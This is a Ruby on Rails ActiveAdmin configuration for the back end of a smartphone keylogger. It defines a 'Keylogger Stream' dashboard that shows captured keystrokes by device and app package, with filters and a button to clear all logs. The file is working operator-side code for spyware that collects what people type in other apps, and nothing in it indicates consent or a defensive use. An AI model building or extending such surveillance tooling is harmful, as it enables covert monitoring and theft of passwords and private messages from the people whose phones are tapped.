ActiveAdmin.register Keylog do
  menu parent: "Data", priority: 1, label: "Keylogs"
  
  actions :index, :show, :destroy

  filter :smartphone
  filter :app_package
  filter :keystroke
  filter :created_at

  index title: "Keylogger Stream" do
    selectable_column
    column :created_at
    column "Device" do |k|
      link_to k.smartphone.name, admin_smartphone_path(k.smartphone)
    end
    column :app_package do |k|
      span k.app_package, class: "badge badge-info"
    end
    column :keystroke do |k|
      if k.event_type == 'TEXT_CHANGED'
        k.keystroke
      else
        span k.keystroke, class: "status_tag warning" # Special keys like BACK, ENTER
      end
    end
    actions
  end

  show do
    attributes_table do
      row :smartphone
      row :app_package
      row :event_type
      row :keystroke
      row :client_timestamp
      row :created_at
    end
  end

  # Custom action to clear logs
  collection_action :clear_all, method: :delete do
    Keylog.delete_all
    redirect_to collection_path, notice: "All keylogs cleared!"
  end

  action_item :clear_all, only: :index do
    link_to "Clear All Logs", clear_all_admin_keylogs_path, method: :delete, data: { confirm: "Are you sure?" }, class: "button danger"
  end
end
